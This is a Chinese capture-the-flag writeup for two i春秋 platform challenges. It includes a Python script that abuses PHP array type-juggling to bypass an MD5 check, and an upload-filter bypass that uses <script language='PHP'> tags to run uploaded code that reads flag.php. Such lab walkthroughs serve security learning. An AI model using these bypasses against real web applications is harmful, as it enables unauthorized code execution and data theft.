# i春秋平台CTF练习writeup

## 0x001 爆破-3

> 分值：10分 类型：MiscWeb 题目名称：爆破-3  
题目内容：
这个真的是爆破。

打开网页发现是源码审计，观察发现如果参数正确会将下一次要输入的参数输出在网页顶部，通过传**数组**可以绕过MD5检测：

```php
 <?php 
error_reporting(0);
session_start();
require('./flag.php');
if(!isset($_SESSION['nums'])){
  $_SESSION['nums'] = 0;
  $_SESSION['time'] = time();
  $_SESSION['whoami'] = 'ea';
}

if($_SESSION['time']+120<time()){
  session_destroy();
}

$value = $_REQUEST['value'];
$str_rand = range('a', 'z');
$str_rands = $str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)];

if($_SESSION['whoami']==($value[0].$value[1]) && substr(md5($value),5,4)==0){
  $_SESSION['nums']++;
  $_SESSION['whoami'] = $str_rands;
  echo $str_rands;
}

if($_SESSION['nums']>=10){
  echo $flag;
}

show_source(__FILE__);
?>
```

Python 代码如下：

```Python
import requests

s = requests.session()

r = s.get("http://fd864919a2194028bc0540857bbe2303d62ae11fe4f94e27.game.ichunqiu.com/?value[]=ea");

for i in range(9):
    url = "http://fd864919a2194028bc0540857bbe2303d62ae11fe4f94e27.game.ichunqiu.com/?value[]=" + r.text[0:2]
    r = s.get(url)
    print(r.text[0:200])
```

在最后一次输出的内容里即包含flag

> p.s. 看了别人的 writeup， 使用的是 `r.content[0:2]`, 自己测试无效，最后发现还是 Python 版本的锅，在Python3 中 `r.content` 是 byte 类型，不能直接拼接字符串，而且转化成字符串后会有 `b'xxx'`的前缀，因此使用了 `r.text[0:2]`

## 0x002 Upload

> 分值：50分 类型：Web 题目名称：Upload  
题目内容：想怎么传就怎么传，就是这么任性。  
tips:flag在flag.php中 

**重点**：

```html
<script language="php">
    strtolower($str);
</script>
<!-- 绕过过滤的一种方法 -->

```

上传题，可以上传任意类型的文件，并且打开，于是尝试上传一段PHP代码

首先尝试：

```php
<?php
show_source('../flag.php');
```

返回内容为：

    show_source('../flag.'); 

发现 `<?php` 和 `php` 字样被过滤掉了，尝试使用大写 `PHP` 发现没有被过滤，但是 `<?` 还是被过滤了，查找资料后了解到一种方法：

```php
<script language='PHP'>
show_source('../flag.'.strtolower("PHP"));
</script>
```

上传成功获得flag
